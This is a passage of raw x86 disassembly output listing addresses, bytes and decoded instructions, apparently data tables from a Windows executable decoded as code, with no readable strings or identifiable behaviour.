  4062fb:	01 2f                	add    %ebp,(%edi)
  4062fd:	00 4b 23             	add    %cl,0x23(%ebx)
  406300:	00 00                	add    %al,(%eax)
  406302:	00 00                	add    %al,(%eax)
  406304:	86 00                	xchg   %al,(%eax)
  406306:	dc 04 90             	faddl  (%eax,%edx,4)
  406309:	01 30                	add    %esi,(%eax)
  40630b:	00 04 36             	add    %al,(%esi,%esi,1)
  40630e:	00 00                	add    %al,(%eax)
  406310:	00 00                	add    %al,(%eax)
  406312:	86 00                	xchg   %al,(%eax)
  406314:	36 08 25 01 31 00 89 	or     %ah,%ss:0x89003101
  40631b:	23 00                	and    (%eax),%eax
  40631d:	00 00                	add    %al,(%eax)
  40631f:	00 86 00 11 1d 0e    	add    %al,0xe1d1100(%esi)
  406325:	00 32                	add    %dh,(%edx)
  406327:	00 9f 23 00 00 00    	add    %bl,0x23(%edi)
  40632d:	00 86 00 95 20 53    	add    %al,0x53209500(%esi)
  406333:	01 32                	add    %esi,(%edx)
  406335:	00 af 23 00 00 00    	add    %ch,0x23(%edi)
  40633b:	00 86 00 66 0a 95    	add    %al,-0x6af59a00(%esi)
  406341:	01 33                	add    %esi,(%ebx)
  406343:	00 ca                	add    %cl,%dl
  406345:	23 00                	and    (%eax),%eax
  406347:	00 00                	add    %al,(%eax)
  406349:	00 86 00 78 07 99    	add    %al,-0x66f88800(%esi)
  40634f:	01 33                	add    %esi,(%ebx)
  406351:	00 df                	add    %bl,%bh
  406353:	23 00                	and    (%eax),%eax
  406355:	00 00                	add    %al,(%eax)
  406357:	00 86 00 f2 18 9e    	add    %al,-0x61e70e00(%esi)
  40635d:	01 34 00             	add    %esi,(%eax,%eax,1)
  406360:	f5                   	cmc
  406361:	23 00                	and    (%eax),%eax
  406363:	00 00                	add    %al,(%eax)
  406365:	00 86 00 fa 1f a3    	add    %al,-0x5ce00600(%esi)
  40636b:	01 35 00 a8 36 00    	add    %esi,0x36a800
  406371:	00 00                	add    %al,(%eax)
  406373:	00 86 00 79 1b 79    	add    %al,0x791b7900(%esi)
  406379:	01 36                	add    %esi,(%esi)
  40637b:	00 fc                	add    %bh,%ah
  40637d:	36 00 00             	add    %al,%ss:(%eax)
  406380:	00 00                	add    %al,(%eax)
  406382:	86 00                	xchg   %al,(%eax)
  406384:	9c                   	pushf
  406385:	01 53 01             	add    %edx,0x1(%ebx)
  406388:	37                   	aaa
  406389:	00 20                	add    %ah,(%eax)
  40638b:	37                   	aaa
  40638c:	00 00                	add    %al,(%eax)
  40638e:	00 00                	add    %al,(%eax)
  406390:	86 00                	xchg   %al,(%eax)
  406392:	93                   	xchg   %eax,%ebx
  406393:	02 5d 01             	add    0x1(%ebp),%bl
  406396:	38 00                	cmp    %al,(%eax)
  406398:	b0 3c                	mov    $0x3c,%al
  40639a:	00 00                	add    %al,(%eax)
  40639c:	00 00                	add    %al,(%eax)
  40639e:	86 00                	xchg   %al,(%eax)
  4063a0:	46                   	inc    %esi
  4063a1:	05 7f 01 39 00       	add    $0x39017f,%eax
  4063a6:	14 3d                	adc    $0x3d,%al
  4063a8:	00 00                	add    %al,(%eax)
  4063aa:	00 00                	add    %al,(%eax)
  4063ac:	86 00                	xchg   %al,(%eax)
  4063ae:	8e 15 5d 01 39 00    	mov    0x39015d,%ss
  4063b4:	0a 24 00             	or     (%eax,%eax,1),%ah
  4063b7:	00 00                	add    %al,(%eax)
  4063b9:	00 86 08 02 14 95    	add    %al,-0x6aebfdf8(%esi)
  4063bf:	01 3a                	add    %edi,(%edx)
  4063c1:	00 12                	add    %dl,(%edx)
  4063c3:	24 00                	and    $0x0,%al
  4063c5:	00 00                	add    %al,(%eax)
  4063c7:	00 86 08 0f 14 53    	add    %al,0x53140f08(%esi)
  4063cd:	01 3a                	add    %edi,(%edx)
  4063cf:	00 1b                	add    %bl,(%ebx)
  4063d1:	24 00                	and    $0x0,%al
  4063d3:	00 00                	add    %al,(%eax)
  4063d5:	00 86 08 75 1c 71    	add    %al,0x711c7508(%esi)
  4063db:	01 3b                	add    %edi,(%ebx)
  4063dd:	00 23                	add    %ah,(%ebx)
  4063df:	24 00                	and    $0x0,%al
  4063e1:	00 00                	add    %al,(%eax)
  4063e3:	00 86 08 83 1c 63    	add    %al,0x631c8308(%esi)
  4063e9:	01 3b                	add    %edi,(%ebx)
  4063eb:	00 2c 24             	add    %ch,(%esp)
  4063ee:	00 00                	add    %al,(%eax)
  4063f0:	00 00                	add    %al,(%eax)
  4063f2:	86 08                	xchg   %cl,(%eax)
  4063f4:	0c 21                	or     $0x21,%al
  4063f6:	75 01                	jne    0x4063f9
  4063f8:	3c 00                	cmp    $0x0,%al
  4063fa:	34 24                	xor    $0x24,%al
  4063fc:	00 00                	add    %al,(%eax)
  4063fe:	00 00                	add    %al,(%eax)
  406400:	86 08                	xchg   %cl,(%eax)
  406402:	18 21                	sbb    %ah,(%ecx)
  406404:	a3 01 3c 00 0c       	mov    %eax,0xc003c01
  406409:	3e 00 00             	add    %al,%ds:(%eax)
  40640c:	00 00                	add    %al,(%eax)
  40640e:	86 08                	xchg   %cl,(%eax)
  406410:	31 25 a8 01 3d 00    	xor    %esp,0x3d01a8
  406416:	3d 24 00 00 00       	cmp    $0x24,%eax
  40641b:	00 86 08 88 0f ad    	add    %al,-0x52f077f8(%esi)
  406421:	01 3d 00 45 24 00    	add    %edi,0x244500
  406427:	00 00                	add    %al,(%eax)
  406429:	00 e1                	add    %ah,%cl
  40642b:	01 43 1d             	add    %eax,0x1d(%ebx)
  40642e:	b2 01                	mov    $0x1,%dl
  406430:	3d 00 52 24 00       	cmp    $0x245200,%eax
  406435:	00 00                	add    %al,(%eax)
  406437:	00 86 18 7a 1d 0e    	add    %al,0xe1d7a18(%esi)
  40643d:	00 3d 00 64 3e 00    	add    %bh,0x3e6400
  406443:	00 00                	add    %al,(%eax)
  406445:	00 96 00 b8 0a 09    	add    %dl,0x90ab800(%esi)
  40644b:	02 3d 00 65 24 00    	add    0x246500,%bh
  406451:	00 00                	add    %al,(%eax)
  406453:	00 96 00 02 0b 10    	add    %dl,0x100b0200(%esi)
  406459:	02 3f                	add    (%edi),%bh
  40645b:	00 88 3e 00 00 00    	add    %cl,0x3e(%eax)
  406461:	00 96 00 06 04 16    	add    %dl,0x16040600(%esi)
  406467:	02 40 00             	add    0x0(%eax),%al
  40646a:	78 20                	js     0x40648c
  40646c:	00 00                	add    %al,(%eax)
  40646e:	00 00                	add    %al,(%eax)
  406470:	86 18                	xchg   %bl,(%eax)
  406472:	7a 1d                	jp     0x406491
  406474:	0e                   	push   %cs
  406475:	00 42 00             	add    %al,0x0(%edx)
  406478:	74 24                	je     0x40649e
  40647a:	00 00                	add    %al,(%eax)
  40647c:	00 00                	add    %al,(%eax)
  40647e:	96                   	xchg   %eax,%esi
  40647f:	00 36                	add    %dh,(%esi)
  406481:	1a 1d 02 42 00 30    	sbb    0x30004202,%bl
  406487:	3f                   	aas
  406488:	00 00                	add    %al,(%eax)
  40648a:	00 00                	add    %al,(%eax)
  40648c:	96                   	xchg   %eax,%esi
  40648d:	00 34 07             	add    %dh,(%edi,%eax,1)
  406490:	23 02                	and    (%edx),%eax
  406492:	43                   	inc    %ebx
  406493:	00 e4                	add    %ah,%ah
  406495:	3f                   	aas
  406496:	00 00                	add    %al,(%eax)
  406498:	00 00                	add    %al,(%eax)
  40649a:	96                   	xchg   %eax,%esi
  40649b:	00 4f 07             	add    %cl,0x7(%edi)
  40649e:	2a 02                	sub    (%edx),%al
  4064a0:	45                   	inc    %ebp
  4064a1:	00 81 24 00 00 00    	add    %al,0x24(%ecx)
  4064a7:	00 96 00 c2 12 32    	add    %dl,0x3212c200(%esi)
  4064ad:	02 47 00             	add    0x0(%edi),%al
  4064b0:	9c                   	pushf
  4064b1:	24 00                	and    $0x0,%al
  4064b3:	00 00                	add    %al,(%eax)
  4064b5:	00 96 00 5e 08 39    	add    %dl,0x39085e00(%esi)
  4064bb:	02 49 00             	add    0x0(%ecx),%cl
  4064be:	bc 24 00 00 00       	mov    $0x24,%esp
  4064c3:	00 96 00 e7 23 40    	add    %dl,0x4023e700(%esi)
  4064c9:	02 4b 00             	add    0x0(%ebx),%cl
  4064cc:	78 40                	js     0x40650e
  4064ce:	00 00                	add    %al,(%eax)
  4064d0:	00 00                	add    %al,(%eax)
  4064d2:	96                   	xchg   %eax,%esi
  4064d3:	00 e6                	add    %ah,%dh
  4064d5:	05 47 02 4d 00       	add    $0x4d0247,%eax
  4064da:	a8 40                	test   $0x40,%al
  4064dc:	00 00                	add    %al,(%eax)
  4064de:	00 00                	add    %al,(%eax)
  4064e0:	96                   	xchg   %eax,%esi
  4064e1:	00 cb                	add    %cl,%bl
  4064e3:	17                   	pop    %ss
  4064e4:	4e                   	dec    %esi
  4064e5:	02 4f 00             	add    0x0(%edi),%cl
  4064e8:	78 20                	js     0x40650a
  4064ea:	00 00                	add    %al,(%eax)
  4064ec:	00 00                	add    %al,(%eax)
  4064ee:	86 18                	xchg   %bl,(%eax)
  4064f0:	7a 1d                	jp     0x40650f
  4064f2:	0e                   	push   %cs
  4064f3:	00 51 00             	add    %dl,0x0(%ecx)
  4064f6:	d4 41                	aam    $0x41
  4064f8:	00 00                	add    %al,(%eax)
  4064fa:	00 00                	add    %al,(%eax)
  4064fc:	96                   	xchg   %eax,%esi
  4064fd:	00 8f 01 0a 00 51    	add    %cl,0x51000a01(%edi)
  406503:	00 78 20             	add    %bh,0x20(%eax)
  406506:	00 00                	add    %al,(%eax)
  406508:	00 00                	add    %al,(%eax)
  40650a:	86 18                	xchg   %bl,(%eax)
  40650c:	7a 1d                	jp     0x40652b
  40650e:	0e                   	push   %cs
  40650f:	00 51 00             	add    %dl,0x0(%ecx)
  406512:	d8 24 00             	fsubs  (%eax,%eax,1)
  406515:	00 00                	add    %al,(%eax)
  406517:	00 96 00 eb 0f 0a    	add    %dl,0xa0feb00(%esi)
  40651d:	00 51 00             	add    %dl,0x0(%ecx)
  406520:	00 45 00             	add    %al,0x0(%ebp)
  406523:	00 00                	add    %al,(%eax)
  406525:	00 91 00 17 08 1d    	add    %dl,0x1d081700(%ecx)
  40652b:	00 51 00             	add    %dl,0x0(%ecx)
  40652e:	4c                   	dec    %esp
  40652f:	45                   	inc    %ebp
  406530:	00 00                	add    %al,(%eax)
  406532:	00 00                	add    %al,(%eax)
  406534:	91                   	xchg   %eax,%ecx
  406535:	00 4b 09             	add    %cl,0x9(%ebx)
  406538:	1d 00 51 00 90       	sbb    $0x90005100,%eax
  40653d:	45                   	inc    %ebp
  40653e:	00 00                	add    %al,(%eax)
  406540:	00 00                	add    %al,(%eax)
  406542:	91                   	xchg   %eax,%ecx
  406543:	00 c6                	add    %al,%dh
  406545:	00 1d 00 51 00 a0    	add    %bl,0xa0005100
  40654b:	46                   	inc    %esi
  40654c:	00 00                	add    %al,(%eax)
  40654e:	00 00                	add    %al,(%eax)
  406550:	91                   	xchg   %eax,%ecx
  406551:	00 76 0a             	add    %dh,0xa(%esi)
  406554:	1d 00 51 00 dc       	sbb    $0xdc005100,%eax
  406559:	46                   	inc    %esi
  40655a:	00 00                	add    %al,(%eax)
  40655c:	00 00                	add    %al,(%eax)
  40655e:	91                   	xchg   %eax,%ecx
  40655f:	00 cc                	add    %cl,%ah
  406561:	20 1d 00 51 00 00    	and    %bl,0x5100
  406567:	00 00                	add    %al,(%eax)
  406569:	00 80 00 96 20 ef    	add    %al,-0x10df6a00(%eax)
  40656f:	1d 55 02 51 00       	sbb    $0x510255,%eax
  406574:	00 00                	add    %al,(%eax)
  406576:	00 00                	add    %al,(%eax)
  406578:	80 00 91             	addb   $0x91,(%eax)
  40657b:	20 39                	and    %bh,(%ecx)
  40657d:	05 5a 02 52 00       	add    $0x52025a,%eax
  406582:	78 20                	js     0x4065a4
  406584:	00 00                	add    %al,(%eax)
  406586:	00 00                	add    %al,(%eax)
  406588:	86 18                	xchg   %bl,(%eax)
  40658a:	7a 1d                	jp     0x4065a9
  40658c:	0e                   	push   %cs
  40658d:	00 54 00 1c          	add    %dl,0x1c(%eax,%eax,1)
  406591:	47                   	inc    %edi
  406592:	00 00                	add    %al,(%eax)
  406594:	00 00                	add    %al,(%eax)
  406596:	86 00                	xchg   %al,(%eax)
  406598:	fb                   	sti
  406599:	24 95                	and    $0x95,%al
  40659b:	01 54 00 a0          	add    %edx,-0x60(%eax,%eax,1)
  40659f:	47                   	inc    %edi
  4065a0:	00 00                	add    %al,(%eax)
  4065a2:	00 00                	add    %al,(%eax)
  4065a4:	86 00                	xchg   %al,(%eax)
  4065a6:	5d                   	pop    %ebp
  4065a7:	14 61                	adc    $0x61,%al
  4065a9:	02 54 00 78          	add    0x78(%eax,%eax,1),%dl
  4065ad:	20 00                	and    %al,(%eax)
  4065af:	00 00                	add    %al,(%eax)
  4065b1:	00 86 18 7a 1d 0e    	add    %al,0xe1d7a18(%esi)
  4065b7:	00 55 00             	add    %dl,0x0(%ebp)
  4065ba:	44                   	inc    %esp
  4065bb:	48                   	dec    %eax
  4065bc:	00 00                	add    %al,(%eax)
  4065be:	00 00                	add    %al,(%eax)
  4065c0:	96                   	xchg   %eax,%esi
  4065c1:	00 2f                	add    %ch,(%edi)
  4065c3:	02 67 02             	add    0x2(%edi),%ah
  4065c6:	55                   	push   %ebp
  4065c7:	00 c0                	add    %al,%al
  4065c9:	48                   	dec    %eax
  4065ca:	00 00                	add    %al,(%eax)
  4065cc:	00 00                	add    %al,(%eax)
  4065ce:	96                   	xchg   %eax,%esi
  4065cf:	00 18                	add    %bl,(%eax)
  4065d1:	0a 6b 02             	or     0x2(%ebx),%ch
  4065d4:	55                   	push   %ebp
  4065d5:	00 28                	add    %ch,(%eax)
  4065d7:	49                   	dec    %ecx
  4065d8:	00 00                	add    %al,(%eax)
  4065da:	00 00                	add    %al,(%eax)
  4065dc:	96                   	xchg   %eax,%esi
  4065dd:	00 eb                	add    %ch,%bl
  4065df:	1a 53 00             	sbb    0x0(%ebx),%dl
  4065e2:	56                   	push   %esi
  4065e3:	00 03                	add    %al,(%ebx)
  4065e5:	25 00 00 00 00       	and    $0x0,%eax
  4065ea:	96                   	xchg   %eax,%esi
  4065eb:	00 44 1a 1d          	add    %al,0x1d(%edx,%ebx,1)
  4065ef:	00 56 00             	add    %dl,0x0(%esi)
  4065f2:	e8 4a 00 00 00       	call   0x406641
  4065f7:	00 96 00 d8 23 0a    	add    %dl,0xa23d800(%esi)
  4065fd:	00 56 00             	add    %dl,0x0(%esi)
  406600:	48                   	dec    %eax
  406601:	4b                   	dec    %ebx
  406602:	00 00                	add    %al,(%eax)
  406604:	00 00                	add    %al,(%eax)
  406606:	96                   	xchg   %eax,%esi
  406607:	00 00                	add    %al,(%eax)
  406609:	07                   	pop    %es
  40660a:	67 02 56 00          	add    0x0(%bp),%dl
  40660e:	1c 4c                	sbb    $0x4c,%al
  406610:	00 00                	add    %al,(%eax)
  406612:	00 00                	add    %al,(%eax)
  406614:	96                   	xchg   %eax,%esi
  406615:	00 49 0a             	add    %cl,0xa(%ecx)
  406618:	79 02                	jns    0x40661c
  40661a:	56                   	push   %esi
  40661b:	00 00                	add    %al,(%eax)
  40661d:	00 00                	add    %al,(%eax)
  40661f:	00 80 00 96 20 85    	add    %al,-0x7adf6a00(%eax)
  406625:	07                   	pop    %es
  406626:	80 02 57             	addb   $0x57,(%edx)
  406629:	00 58 4c             	add    %bl,0x4c(%eax)
  40662c:	00 00                	add    %al,(%eax)
  40662e:	00 00                	add    %al,(%eax)
  406630:	96                   	xchg   %eax,%esi
  406631:	00 f0                	add    %dh,%al
  406633:	24 0a                	and    $0xa,%al
  406635:	00 58 00             	add    %bl,0x0(%eax)
  406638:	88 4c 00 00          	mov    %cl,0x0(%eax,%eax,1)
  40663c:	00 00                	add    %al,(%eax)
  40663e:	96                   	xchg   %eax,%esi
  40663f:	00 37                	add    %dh,(%edi)
  406641:	17                   	pop    %ss
  406642:	1d 00 58 00 19       	sbb    $0x19005800,%eax
  406647:	25 00 00 00 00       	and    $0x0,%eax
  40664c:	96                   	xchg   %eax,%esi
  40664d:	00 a1 06 0a 00 58    	add    %ah,0x58000a06(%ecx)
  406653:	00 32                	add    %dh,(%edx)
  406655:	25 00 00 00 00       	and    $0x0,%eax
  40665a:	96                   	xchg   %eax,%esi
  40665b:	00 e1                	add    %ah,%cl
  40665d:	16                   	push   %ss
  40665e:	97                   	xchg   %eax,%edi
  40665f:	02 58 00             	add    0x0(%eax),%bl
  406662:	a8 4c                	test   $0x4c,%al
  406664:	00 00                	add    %al,(%eax)
  406666:	00 00                	add    %al,(%eax)
  406668:	96                   	xchg   %eax,%esi
  406669:	00 0a                	add    %cl,(%edx)
  40666b:	15 0a 00 5a 00       	adc    $0x5a000a,%eax
  406670:	e8 4c 00 00 00       	call   0x4066c1
  406675:	00 96 00 62 24 0a    	add    %dl,0xa246200(%esi)
  40667b:	00 5a 00             	add    %bl,0x0(%edx)
  40667e:	00 00                	add    %al,(%eax)
  406680:	00 00                	add    %al,(%eax)
  406682:	80 00 91             	addb   $0x91,(%eax)
  406685:	20 b6 04 9e 02 5a    	and    %dh,0x5a029e04(%esi)
  40668b:	00 1c 4d 00 00 00 00 	add    %bl,0x0(,%ecx,2)
  406692:	96                   	xchg   %eax,%esi
  406693:	00 a9 24 a5 02 5d    	add    %ch,0x5d02a524(%ecx)
  406699:	00 7c 4d 00          	add    %bh,0x0(%ebp,%ecx,2)
  40669d:	00 00                	add    %al,(%eax)
  40669f:	00 96 00 54 24 6b    	add    %dl,0x6b245400(%esi)
  4066a5:	02 5f 00             	add    0x0(%edi),%bl
  4066a8:	e0 4d                	loopne 0x4066f7
  4066aa:	00 00                	add    %al,(%eax)
  4066ac:	00 00                	add    %al,(%eax)
  4066ae:	96                   	xchg   %eax,%esi
  4066af:	00 27                	add    %ah,(%edi)
  4066b1:	0a 84 00 60 00 40 4e 	or     0x4e400060(%eax,%eax,1),%al
  4066b8:	00 00                	add    %al,(%eax)
  4066ba:	00 00                	add    %al,(%eax)
  4066bc:	96                   	xchg   %eax,%esi
  4066bd:	00 aa 0a 1d 00 61    	add    %ch,0x61001d0a(%edx)
  4066c3:	00 4c 25 00          	add    %cl,0x0(%ebp,%eiz,1)
  4066c7:	00 00                	add    %al,(%eax)
  4066c9:	00 91 18 80 1d 0a    	add    %dl,0xa1d8018(%ecx)
  4066cf:	00 61 00             	add    %ah,0x0(%ecx)
  4066d2:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4066d3:	4e                   	dec    %esi
  4066d4:	00 00                	add    %al,(%eax)
  4066d6:	00 00                	add    %al,(%eax)
  4066d8:	96                   	xchg   %eax,%esi
  4066d9:	00 72 01             	add    %dh,0x1(%edx)
  4066dc:	9a 00 61 00 c0 50 00 	lcall  $0x50,$0xc0006100
  4066e3:	00 00                	add    %al,(%eax)
  4066e5:	00 91 00 b6 24 ab    	add    %dl,-0x54db4a00(%ecx)
  4066eb:	02 62 00             	add    0x0(%edx),%ah
  4066ee:	62 25 00 00 00 00    	bound  %esp,0x0
  4066f4:	91                   	xchg   %eax,%ecx
  4066f5:	00 e3                	add    %ah,%bl
  4066f7:	0c 0a                	or     $0xa,%al
  4066f9:	00 63 00             	add    %ah,0x0(%ebx)
  4066fc:	92                   	xchg   %eax,%edx
  4066fd:	25 00 00 00 00       	and    $0x0,%eax
  406702:	96                   	xchg   %eax,%esi
  406703:	00 07                	add    %al,(%edi)
  406705:	1b b1 02 63 00 c9    	sbb    -0x36ff9cfe(%ecx),%esi
  40670b:	25 00 00 00 00       	and    $0x0,%eax
  406710:	91                   	xchg   %eax,%ecx
  406711:	18 80 1d 0a 00 64    	sbb    %al,0x64000a1d(%eax)
  406717:	00 e8                	add    %ch,%al
  406719:	51                   	push   %ecx
  40671a:	00 00                	add    %al,(%eax)
  40671c:	00 00                	add    %al,(%eax)
  40671e:	86 18                	xchg   %bl,(%eax)
  406720:	7a 1d                	jp     0x40673f
  406722:	53                   	push   %ebx
  406723:	01 64 00 d5          	add    %esp,-0x2b(%eax,%eax,1)
  406727:	25 00 00 00 00       	and    $0x0,%eax
  40672c:	86 00                	xchg   %al,(%eax)
  40672e:	cc                   	int3
  40672f:	06                   	push   %es
  406730:	de 02                	fiadds (%edx)
  406732:	65 00 58 52          	add    %bl,%gs:0x52(%eax)
  406736:	00 00                	add    %al,(%eax)
  406738:	00 00                	add    %al,(%eax)
  40673a:	86 00                	xchg   %al,(%eax)
  40673c:	0b 26                	or     (%esi),%esp
  40673e:	e3 02                	jecxz  0x406742
  406740:	66 00 ed             	data16 add %ch,%ch
  406743:	25 00 00 00 00       	and    $0x0,%eax
  406748:	86 00                	xchg   %al,(%eax)
  40674a:	af                   	scas   %es:(%edi),%eax
  40674b:	02 de                	add    %dh,%bl
  40674d:	02 67 00             	add    0x0(%edi),%ah
  406750:	98                   	cwtl
  406751:	53                   	push   %ebx
  406752:	00 00                	add    %al,(%eax)
  406754:	00 00                	add    %al,(%eax)
  406756:	86 00                	xchg   %al,(%eax)
  406758:	96                   	xchg   %eax,%esi
  406759:	1b e3                	sbb    %ebx,%esp
  40675b:	02 68 00             	add    0x0(%eax),%ch
  40675e:	40                   	inc    %eax
  40675f:	55                   	push   %ebp
  406760:	00 00                	add    %al,(%eax)
  406762:	48                   	dec    %eax
  406763:	00 81 00 a8 15 ea    	add    %al,-0x15ea5800(%ecx)
  406769:	02 69 00             	add    0x0(%ecx),%ch
  40676c:	05 26 00 00 00       	add    $0x26,%eax
  406771:	00 91 18 80 1d 0a    	add    %dl,0xa1d8018(%ecx)
  406777:	00 6b 00             	add    %ch,0x0(%ebx)
  40677a:	68 55 00 00 00       	push   $0x55
  40677f:	00 96 00 23 13 6b    	add    %dl,0x6b132300(%esi)
  406785:	02 6b 00             	add    0x0(%ebx),%ch
  406788:	ec                   	in     (%dx),%al
  406789:	55                   	push   %ebp
  40678a:	00 00                	add    %al,(%eax)
  40678c:	00 00                	add    %al,(%eax)
  40678e:	96                   	xchg   %eax,%esi
  40678f:	00 74 03 d3          	add    %dh,-0x2d(%ebx,%eax,1)
  406793:	00 6c 00 24          	add    %ch,0x24(%eax,%eax,1)
  406797:	56                   	push   %esi
  406798:	00 00                	add    %al,(%eax)
  40679a:	00 00                	add    %al,(%eax)
  40679c:	96                   	xchg   %eax,%esi
  40679d:	00 b6 1d d3 00 6d    	add    %dh,0x6d00d31d(%esi)
  4067a3:	00 a4 56 00 00 00 00 	add    %ah,0x0(%esi,%edx,2)
  4067aa:	96                   	xchg   %eax,%esi
  4067ab:	00 28                	add    %ch,(%eax)
  4067ad:	08 d3                	or     %dl,%bl
  4067af:	00 6e 00             	add    %ch,0x0(%esi)
  4067b2:	00 00                	add    %al,(%eax)
  4067b4:	01 00                	add    %eax,(%eax)
  4067b6:	ff 0c 00             	decl   (%eax,%eax,1)
  4067b9:	00 01                	add    %al,(%ecx)
  4067bb:	00 b7 12 00 00 01    	add    %dh,0x1000012(%edi)
  4067c1:	00 6c 02 00          	add    %ch,0x0(%edx,%eax,1)
  4067c5:	00 01                	add    %al,(%ecx)
  4067c7:	00 00                	add    %al,(%eax)
  4067c9:	03 00                	add    (%eax),%eax
  4067cb:	00 01                	add    %al,(%ecx)
  4067cd:	00 80 09 00 00 01    	add    %al,0x1000009(%eax)
  4067d3:	00 81 01 00 00 01    	add    %al,0x1000001(%ecx)
  4067d9:	00 91 23 00 00 01    	add    %dl,0x1000023(%ecx)
  4067df:	00 d3                	add    %dl,%bl
  4067e1:	16                   	push   %ss
  4067e2:	00 00                	add    %al,(%eax)
  4067e4:	01 00                	add    %eax,(%eax)
  4067e6:	1f                   	pop    %ds
  4067e7:	24 00                	and    $0x0,%al
  4067e9:	00 01                	add    %al,(%ecx)
  4067eb:	00 13                	add    %dl,(%ebx)
  4067ed:	1b 00                	sbb    (%eax),%eax
  4067ef:	00 01                	add    %al,(%ecx)
  4067f1:	00 8f 18 00 00 02    	add    %cl,0x2000018(%edi)
  4067f7:	00 e9                	add    %ch,%cl
  4067f9:	20 00                	and    %al,(%eax)
  4067fb:	00 03                	add    %al,(%ebx)
  4067fd:	00 ac 00 00 00 04 00 	add    %ch,0x40000(%eax,%eax,1)
  406804:	79 08                	jns    0x40680e
  406806:	00 00                	add    %al,(%eax)
  406808:	01 00                	add    %eax,(%eax)
  40680a:	2b 15 00 00 01 00    	sub    0x10000,%edx
  406810:	0b 1a                	or     (%edx),%ebx
  406812:	00 00                	add    %al,(%eax)
  406814:	01 00                	add    %eax,(%eax)
  406816:	3a 24 00             	cmp    (%eax,%eax,1),%ah
  406819:	00 01                	add    %al,(%ecx)
  40681b:	00 76 06             	add    %dh,0x6(%esi)
  40681e:	00 00                	add    %al,(%eax)
  406820:	01 00                	add    %eax,(%eax)
  406822:	1b 1a                	sbb    (%edx),%ebx
  406824:	00 00                	add    %al,(%eax)
  406826:	01 00                	add    %eax,(%eax)
  406828:	52                   	push   %edx
  406829:	17                   	pop    %ss
  40682a:	00 00                	add    %al,(%eax)
  40682c:	01 00                	add    %eax,(%eax)
  40682e:	40                   	inc    %eax
  40682f:	07                   	pop    %es
  406830:	00 00                	add    %al,(%eax)
  406832:	01 00                	add    %eax,(%eax)
  406834:	b9 01 00 00 01       	mov    $0x1000001,%ecx
  406839:	00 31                	add    %dh,(%ecx)
  40683b:	06                   	push   %es
  40683c:	00 00                	add    %al,(%eax)
  40683e:	01 00                	add    %eax,(%eax)
  406840:	81 0a 00 00 01 00    	orl    $0x10000,(%edx)
  406846:	38 01                	cmp    %al,(%ecx)
  406848:	00 00                	add    %al,(%eax)
  40684a:	01 00                	add    %eax,(%eax)
  40684c:	6e                   	outsb  %ds:(%esi),(%dx)
  40684d:	1b 00                	sbb    (%eax),%eax
  40684f:	00 01                	add    %al,(%ecx)
  406851:	00 15 02 00 00 01    	add    %dl,0x1000002
  406857:	00 c6                	add    %al,%dh
  406859:	01 00                	add    %eax,(%eax)
  40685b:	00 01                	add    %al,(%ecx)
  40685d:	00 e1                	add    %ah,%cl
  40685f:	24 00                	and    $0x0,%al
  406861:	00 02                	add    %al,(%edx)
  406863:	00 af 06 00 00 01    	add    %ch,0x1000006(%edi)
  406869:	00 c2                	add    %al,%dl
  40686b:	04 00                	add    $0x0,%al
  40686d:	00 01                	add    %al,(%ecx)
  40686f:	00 c8                	add    %cl,%al
  406871:	05 00 00 01 00       	add    $0x10000,%eax
  406876:	e6 06                	out    %al,$0x6
  406878:	00 00                	add    %al,(%eax)
  40687a:	01 00                	add    %eax,(%eax)
  40687c:	04 05                	add    $0x5,%al
  40687e:	00 00                	add    %al,(%eax)
  406880:	01 00                	add    %eax,(%eax)
  406882:	61                   	popa
  406883:	1f                   	pop    %ds
  406884:	00 00                	add    %al,(%eax)
  406886:	01 00                	add    %eax,(%eax)
  406888:	0d 03 00 00 01       	or     $0x1000003,%eax
  40688d:	00 85 06 00 00 01    	add    %al,0x1000006(%ebp)
  406893:	00 41 02             	add    %al,0x2(%ecx)
  406896:	00 00                	add    %al,(%eax)
  406898:	01 00                	add    %eax,(%eax)
  40689a:	28 0b                	sub    %cl,(%ebx)
  40689c:	00 00                	add    %al,(%eax)
  40689e:	01 00                	add    %eax,(%eax)
  4068a0:	7e 24                	jle    0x4068c6
  4068a2:	00 00                	add    %al,(%eax)
  4068a4:	01 00                	add    %eax,(%eax)
  4068a6:	cf                   	iret
  4068a7:	1a 00                	sbb    (%eax),%al
  4068a9:	00 01                	add    %al,(%ecx)
  4068ab:	00 4d 03             	add    %cl,0x3(%ebp)
  4068ae:	00 00                	add    %al,(%eax)
  4068b0:	01 00                	add    %eax,(%eax)
  4068b2:	db 12                	fistl  (%edx)
  4068b4:	00 00                	add    %al,(%eax)
  4068b6:	02 00                	add    (%eax),%al
  4068b8:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4068b9:	03 00                	add    (%eax),%eax
  4068bb:	00 01                	add    %al,(%ecx)
  4068bd:	00 20                	add    %ah,(%eax)
  4068bf:	16                   	push   %ss
  4068c0:	00 00                	add    %al,(%eax)
  4068c2:	02 00                	add    (%eax),%al
  4068c4:	b1 08                	mov    $0x8,%cl
  4068c6:	00 00                	add    %al,(%eax)
  4068c8:	01 00                	add    %eax,(%eax)
  4068ca:	e6 08                	out    %al,$0x8
  4068cc:	00 00                	add    %al,(%eax)
  4068ce:	01 00                	add    %eax,(%eax)
  4068d0:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4068d1:	1b 00                	sbb    (%eax),%eax
  4068d3:	00 01                	add    %al,(%ecx)
  4068d5:	00 c6                	add    %al,%dh
  4068d7:	03 00                	add    (%eax),%eax
  4068d9:	00 01                	add    %al,(%ecx)
  4068db:	00 3b                	add    %bh,(%ebx)
  4068dd:	15 00 00 01 00       	adc    $0x10000,%eax
  4068e2:	fb                   	sti
  4068e3:	1a 00                	sbb    (%eax),%al
  4068e5:	00 01                	add    %al,(%ecx)
  4068e7:	00 05 09 00 00 01    	add    %al,0x1000009
  4068ed:	00 40 09             	add    %al,0x9(%eax)
  4068f0:	00 00                	add    %al,(%eax)
  4068f2:	01 00                	add    %eax,(%eax)
  4068f4:	d5 1d                	aad    $0x1d
  4068f6:	00 00                	add    %al,(%eax)
  4068f8:	01 00                	add    %eax,(%eax)
  4068fa:	30 09                	xor    %cl,(%ecx)
  4068fc:	00 00                	add    %al,(%eax)
  4068fe:	01 00                	add    %eax,(%eax)
  406900:	d3 25 00 00 01 00    	shll   %cl,0x10000
  406906:	5d                   	pop    %ebp
  406907:	02 00                	add    (%eax),%al
  406909:	00 01                	add    %al,(%ecx)
  40690b:	00 e3                	add    %ah,%bl
  40690d:	00 00                	add    %al,(%eax)
  40690f:	00 01                	add    %al,(%ecx)
